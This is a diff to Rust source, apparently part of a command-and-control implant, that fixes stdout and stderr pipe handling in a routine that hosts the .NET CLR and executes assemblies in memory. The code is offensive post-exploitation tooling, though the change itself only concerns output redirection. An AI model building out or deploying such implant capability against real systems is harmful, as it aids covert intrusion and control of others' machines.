@@ -324,6 +324,16 @@ pub fn exec_dotnet(asm_bytes: &[u8], args: &str, child_mode: bool) -> String {
         let Some(oa) = load_oleaut32() else {
             return "[!] dotnet_exec: oleaut32.dll load failed".into();
         };
+
+        // Capture pipe handle BEFORE CLR init — ICorRuntimeHost::Start() may
+        // reset standard handles internally (same behaviour documented in the Go agent).
+        let h_pipe: HANDLE = if child_mode {
+            let h = GetStdHandle(STD_OUTPUT_HANDLE);
+            if h == 0 { INVALID_HANDLE_VALUE } else { h }
+        } else {
+            INVALID_HANDLE_VALUE
+        };
+
         let hms = LoadLibraryA(b"mscoree.dll\0".as_ptr());
         if hms == 0 { return "[!] dotnet_exec: mscoree.dll not found".into(); }
         type FnCI = unsafe extern "system" fn(*const Guid, *const Guid, *mut *mut u8) -> i32;
@@ -360,6 +370,13 @@ pub fn exec_dotnet(asm_bytes: &[u8], args: &str, child_mode: bool) -> String {
         let hr_start = start(p_ch);
         if hr_start < 0 && hr_start != 1 {
             return "[!] dotnet_exec: Start failed".into();
+        }
+
+        // Re-apply stdout/stderr to the pipe immediately after Start().
+        // ICorRuntimeHost::Start() may reset standard handles internally.
+        if child_mode && h_pipe != INVALID_HANDLE_VALUE {
+            SetStdHandle(STD_OUTPUT_HANDLE, h_pipe);
+            SetStdHandle(STD_ERROR_HANDLE, h_pipe);
         }
 
         // GetDefaultDomain  vtbl[13]
@@ -405,9 +422,13 @@ pub fn exec_dotnet(asm_bytes: &[u8], args: &str, child_mode: bool) -> String {
 
         let sa_params = args_to_param_sa(&oa, args);
 
-        // Redirect stdout: temp file (normal) or use inherited pipe (child).
+        // Redirect stdout: temp file (normal) or use pre-captured pipe (child).
+        // Use h_pipe (captured before Start) rather than GetStdHandle — Start()
+        // may have reset the handle.
         let (fh_tmp, tmp_path, orig_out, orig_err) = if child_mode {
-            let fh = GetStdHandle(STD_OUTPUT_HANDLE);
+            let fh = if h_pipe != INVALID_HANDLE_VALUE { h_pipe }
+                     else { GetStdHandle(STD_OUTPUT_HANDLE) };
+            SetStdHandle(STD_OUTPUT_HANDLE, fh);
             SetStdHandle(STD_ERROR_HANDLE, fh);
             (fh, Vec::<u16>::new(), 0isize, 0isize)
         } else {
